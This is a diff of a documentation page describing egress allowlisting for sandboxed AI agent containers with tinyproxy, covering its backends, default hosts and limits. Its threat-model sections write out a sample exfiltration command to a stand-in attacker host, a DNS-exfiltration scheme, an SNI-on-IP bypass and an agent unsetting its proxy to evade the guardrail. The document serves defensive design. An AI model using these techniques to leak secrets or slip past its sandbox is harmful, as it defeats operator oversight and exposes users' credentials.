@@ -1,143 +1,223 @@
-# Network allowlist
+# Network egress
 
-This page covers the **egress** boundary — what hosts AO workers can
+This page covers the **egress** boundary — what hosts an agent can
 reach outbound. Companion docs: [`sandbox.md`](./sandbox.md) for the
 filesystem layer this assumes, and [`auth.md`](./auth.md) for the
-identity material that flows through these hosts.
+secret material whose exfiltration this defends against.
 
-## Modes
+Implementation lives in `src/egress.rs`. End-to-end manual
+verification is documented at
+[`SMOKE_EGRESS.md`](./SMOKE_EGRESS.md).
 
-`~/.config/fleet/config.toml`:
+## Policy modes
 
-```toml
-[network]
-mode = "allowlist"        # "open" (default) | "allowlist"
-extra_allow = [
-  "crates.io",
-  "static.crates.io",
-  "pypi.org",
-]
+`.fleet/config.yaml`'s `runtime.network` block has three policies:
+
+```yaml
+runtime:
+  network:
+    policy: allowlist       # allowlist | open | none
+    extra_hosts:
+      - api.linear.app
+      - crates.io
 ```
 
-- `open` (default) — workers reach any host, no proxy enforcement.
-  Matches fleet's pre-Phase-3 behaviour; an upgrade doesn't silently
-  start dropping traffic.
-- `allowlist` — workers' `HTTPS_PROXY` and `HTTP_PROXY` point at the
-  in-VM `tinyproxy`, which only proxies CONNECTs / requests to hosts
-  on the allowlist. Anything else returns `403 Forbidden`.
+- **`open`** (default): no enforcement. The container reaches whatever
+  the engine + host allow. Matches the pre-egress baseline.
+- **`allowlist`**: outbound HTTP/HTTPS is forced through a tinyproxy
+  that admits only the hosts in `extra_hosts` plus fleet's built-in
+  defaults. Everything else is denied at the proxy.
+- **`none`**: reserved for fully-offline workflows; rejects all
+  egress at the proxy. (Net result of `allowlist` with an empty
+  allowlist.)
 
-## What's allowed by default
+The default is `open` so a fresh install Just Works for users who
+haven't thought about egress yet. Flip to `allowlist` before running
+anything you don't fully trust.
 
-The built-in baseline (always present under `allowlist` mode) covers
-the hosts the AO + Claude + git-bug stack itself needs:
+## The two backends
 
-- `api.anthropic.com` (Claude API)
-- `github.com`, `api.github.com`, `raw.githubusercontent.com`,
-  `objects.githubusercontent.com`, `codeload.github.com`,
-  `cli.github.com` (gh + git over HTTPS + raw user content)
-- `registry.npmjs.org`, `deb.nodesource.com`, `nodejs.org` (claude-code
-  + AO are npm packages)
-- `archive.ubuntu.com`, `security.ubuntu.com`, `ports.ubuntu.com`
-  (Ubuntu apt mirrors, used by the preflight tracker-tool installer)
-- `git-bug.org` (release binary for the git-bug tracker)
+Fleet picks the egress enforcer based on the chosen runtime adapter.
+The trait is `EgressEnforcer` (`src/egress.rs`), with three concrete
+impls.
 
-The exact list lives in `BUILT_IN_ALLOW` in
-[`src/network.rs`](../src/network.rs).
+### `PodmanTinyproxyEnforcer` (Linux + Podman + `policy: allowlist`)
 
-`extra_allow` is **additive**. Suffix-match semantics: an entry of
-`example.com` covers `api.example.com`, `cdn.example.com`, etc.
+The strongest config. Three steps at session start:
 
-## How it works
+1. **Internal network.** `podman network create --internal
+   fleet-<sid>`. The `--internal` flag means containers on this
+   network have no route to the outside; only other containers on
+   the same network are reachable.
+2. **Sidecar.** A tinyproxy container is run on that network with
+   the allowlist baked into its config. The workflow container's
+   `HTTP_PROXY` / `HTTPS_PROXY` point at the sidecar's hostname on
+   the internal network.
+3. **Bridge the sidecar outward.** After step 2, the sidecar is
+   `podman network connect`-ed to the default `podman` bridge
+   network. The sidecar gets a route out; the workflow container
+   does not. The two-step is more verbose than `--network=bridge`
+   once, but it makes the audit trail clearer: only the sidecar
+   ever bridges outward, never the workflow container.
 
+Result: the workflow container has exactly one network path — through
+the sidecar — and the sidecar refuses CONNECTs to hosts not on the
+allowlist.
+
+### `HostProxyEnforcer` (macOS Apple Container or Docker + `policy: allowlist`)
+
+The fallback for platforms that don't have a `--internal`-network
+primitive equivalent.
+
+1. **Host-side tinyproxy.** Fleet writes a tinyproxy config to a
+   tempdir on the host, with the allowlist baked in.
+2. **Spawn the daemon.** Fleet invokes `tinyproxy -d` against that
+   config; the daemon listens on a local port on the host.
+3. **Inject proxy env.** Fleet sets `HTTP_PROXY` /
+   `HTTPS_PROXY` on the workflow container to point at the engine's
+   host-bridge DNS name (`host.containers.internal` for Apple
+   Container, `host.docker.internal` for Docker) plus the chosen
+   port.
+
+Result: the workflow container's *cooperative* HTTP clients reach
+the proxy; the proxy refuses CONNECTs to disallowed hosts. The host
+firewall is not modified; nothing prevents a raw socket inside the
+container from dialling the host directly.
+
+This is weaker than the Podman path — see the caveats below. Honest
+disclosure on macOS: this is a **guardrail**, not a hard boundary.
+
+### `NoopEnforcer`
+
+Used when `policy: open`, when the adapter is `local`, and as the
+fallback when no real enforcer matches the (adapter, policy)
+combination. Returns an empty setup; the container behaves as it
+would without egress at all.
+
+## The default allowlist
+
+Even with `extra_hosts: []`, fleet adds a small set of defaults
+derived from the rest of `.fleet/config.yaml`:
+
+| Host                  | Why                                                                 |
+| --------------------- | ------------------------------------------------------------------- |
+| `registry-1.docker.io` | The tinyproxy sidecar's own image lives there; the proxy can't bootstrap without it. (Podman backend only.) |
+| `api.github.com`, `github.com` | Added when `tracker: github`. Required for `gh issue list / gh pr create`.        |
+| `api.anthropic.com`   | Added when any agent's `env_passthrough` mentions `ANTHROPIC`. The claude-code default agent triggers it. |
+| `api.openai.com`      | Added when any agent's `env_passthrough` mentions `OPENAI`.         |
+
+The list is computed at proxy-setup time from your config; you don't
+maintain it. `extra_hosts` is for everything else — language
+registries (`crates.io`, `registry.npmjs.org`, `pypi.org`), your own
+internal CDN, the docs site your agent reads.
+
+Wildcards are **not** expanded. `*.crates.io` is a literal string
+match against the SNI / Host header. The proxy backend may or may
+not honour wildcards — don't rely on it.
+
+## What this protects against
+
+- **Accidental exfiltration.** An agent that runs
+  `curl evil.example.com -d $ANTHROPIC_API_KEY` gets a `403 Forbidden`
+  from the proxy rather than a successful POST. The agent log shows
+  the deny, the secret stays on your account.
+- **Honest-mistake fetches.** An agent that pulls from an unintended
+  CDN gets a clear deny. Adding the CDN to `extra_hosts` is the fix;
+  the deny is loud enough to notice.
+- **Background unsolicited connections.** Anything in the image build
+  or in the agent's process that dials an unallowed host fails fast.
+  No 30-second timeouts; no silent retries swallowing the cost.
+
+## What it does NOT protect against
+
+The egress module's own docstring is the source of truth; the three
+honest gaps:
+
+- **DNS exfiltration.** tinyproxy doesn't intercept DNS. The container
+  asks the host resolver for `api.anthropic.com` (allowed) but the
+  attacker can encode a payload into a TXT-record lookup of
+  `${base64 secret}.attacker.com` and the host resolver dutifully
+  forwards it. Allowlist'd nameservers don't help — the *query
+  itself* carries the data. The DNS-stub-resolver follow-up closes
+  this on Linux; macOS path can't until Apple Container ships
+  network-isolation primitives.
+- **SNI-on-IP bypass.** A client that sets `curl --resolve
+  example.com:1.2.3.4` makes the proxy believe it's talking to
+  `example.com` (allowlist'd) while actually connecting to
+  `1.2.3.4` (attacker-controlled). tinyproxy filters on the
+  CONNECT line, which carries the hostname the client sent.
+- **An agent that `unset HTTP_PROXY`** (macOS path). On Linux Podman,
+  the workflow container's `--internal` network means there's no
+  outbound route except through the sidecar — unsetting the env
+  doesn't help, the container has nowhere else to go. On macOS, the
+  HostProxyEnforcer is env-only: unsetting `HTTP_PROXY` and dialling
+  a raw socket reaches the network directly. This is the cooperative
+  bit of the boundary.
+
+## How to add a host
+
+1. Edit `.fleet/config.yaml`:
+
+   ```yaml
+   runtime:
+     network:
+       policy: allowlist
+       extra_hosts:
+         - registry.npmjs.org
+         - your-internal-cdn.example.com
+   ```
+
+2. Re-run your workflow. The new allowlist is read at every
+   `fleet workflow run` / `resume` / `replay`; no daemon to restart.
+
+The host must match the **SNI** the client sends. `npm` and `pip`
+send the hostname you'd expect (`registry.npmjs.org`,
+`pypi.org`). `apt` is more involved — apt mirrors use redirector
+URLs that change the actual Host header; if `apt update` fails
+inside an agent, run it with `apt-get update -o Debug::Acquire=true`
+to see which hosts it actually hits and add them.
+
+## How to verify it's actually working
+
+[`SMOKE_EGRESS.md`](./SMOKE_EGRESS.md) is the manual checklist:
+deny verification (`curl evil.example.com` → blocked), allow
+verification (`curl api.anthropic.com` → allowed), and a quick
+look at the proxy logs. Run it once per supported (OS, adapter)
+combination after any egress-related change.
+
+## Operations
+
+**See the current policy in effect.**
+
+```sh
+fleet runtime doctor
 ```
-fleet start
-   │
-   ├──► sync_in_vm_filter()                         (host-side)
-   │      limactl shell --user root fleet-vm bash -c '
-   │        cat > /etc/tinyproxy/fleet-allow.filter
-   │        systemctl reload tinyproxy
-   │      '
-   │
-   ├──► CommandSpec includes HTTPS_PROXY=http://127.0.0.1:8888
-   │                         HTTP_PROXY=…
-   │                         NO_PROXY=127.0.0.1,localhost,::1
-   │
-   └──► ao start  (worker shells inherit the proxy env via tmux)
+
+Reports the chosen adapter, the configured policy, and the
+enforcer that would be selected for a workflow run.
+
+**Tail the sidecar's logs (Podman only).**
+
+```sh
+podman logs fleet-proxy-<sid>
 ```
 
-The same allowlist is also rendered into the worker's `AGENTS.md` as
-a `## Network access` section, so the agent sees the host list up
-front and gives a clean "host X is not on the allowlist" message
-instead of retry-looping against a blocked CDN.
+Where `<sid>` is the session id. Each denied request appears here
+with the rejected hostname and the source container.
 
-## Cooperative, not enforcing
+**Tail the host-side daemon's logs (macOS / Docker).**
 
-This is the important caveat. fleet's Phase 3 allowlist is a **proxy
-env var that cooperating tools respect**. A worker process that does
-`unset HTTPS_PROXY HTTP_PROXY` can still reach arbitrary hosts.
+The `HostProxyEnforcer` writes its tinyproxy log to a tempfile under
+`$TMPDIR/fleet-proxy-<sid>/`. The path is logged at session start;
+grep your fleet output for `host-proxy log`.
 
-That works because the bigger boundary is the Lima VM kernel boundary
-(see `sandbox.md`): even an agent that bypasses the proxy can only
-talk from inside its VM, can't read host dotfiles, and its commits
-still go through brokered identity. The proxy is "don't accidentally
-fetch from the wrong CDN" — not "an adversary actively trying to
-exfiltrate".
+**Disable enforcement to debug.**
 
-**Kernel-level enforcement (nftables egress block forcing all outbound
-traffic through tinyproxy, no env-var bypass) is on the roadmap** and
-will live alongside the cooperative layer once it ships.
-
-## Tools that respect `HTTPS_PROXY` cleanly
-
-- `gh` CLI (uses `HTTPS_PROXY` and respects `NO_PROXY`)
-- `git` over HTTPS (`http.proxy` falls back to `HTTPS_PROXY` env)
-- `curl`, `wget`
-- `npm`, `pnpm`, `yarn`
-- `cargo` (with `[http] check-revoke = false` may need tweaking)
-- `pip`, `pipx`
-- `claude-code` (Node fetch respects `HTTPS_PROXY`)
-
-If a tool doesn't read `HTTPS_PROXY`, its requests go direct and bypass
-the allowlist silently.
-
-## Failure modes
-
-- **Worker tries an off-list host** — tinyproxy returns 403. Tools
-  surface this as e.g. `curl: (56) Received HTTP code 403 from proxy
-  after CONNECT`. Worker AGENTS.md tells the agent to escalate to the
-  user rather than retry.
-- **tinyproxy is down** — workers fail to make outbound requests at all.
-  Symptoms include `Connection refused` from anything that calls out.
-  `limactl shell fleet-vm systemctl status tinyproxy` from the host
-  is the diagnostic; logs at `/var/log/tinyproxy/tinyproxy.log`.
-- **fleet's sync failed** — fleet logs a warning at start time
-  (`tinyproxy filter sync failed; using previous filter`) and proceeds.
-  The proxy will serve the last successful filter, which may be empty
-  on a fresh VM. Re-run `fleet start` after fixing whatever broke
-  (commonly: VM stopped between sync attempts).
-- **Mode changed `allowlist → open`** — the next `fleet start` stops
-  setting `HTTPS_PROXY` in the worker env, so new workers go direct.
-  Existing AO sessions still have the env from when they started;
-  restart the AO stack (`fleet stop && fleet start`) to refresh.
-
-## Adding a host
-
-```toml
-[network]
-mode = "allowlist"
-extra_allow = ["my-cdn.example.com"]
+```yaml
+runtime:
+  network:
+    policy: open
 ```
 
-Then `fleet start` (or Shift+X → Shift+S in the TUI). The next time an
-AO worker spawns, the new host is reachable.
-
-## Why tinyproxy?
-
-It's the smallest well-known forward proxy with hostname allowlist
-support that fits the cooperative model. ~50KB binary, available in
-Ubuntu's main repo, configured via a plain file + regex filter, no
-runtime state, fits cleanly into cloud-init.
-
-When kernel-level enforcement lands the proxy may stay, may not —
-either way the user-visible config schema (`[network]` block) doesn't
-have to change.
+Lifts the proxy for the whole repo. Use sparingly — and remember
+to flip back before running anything untrusted.
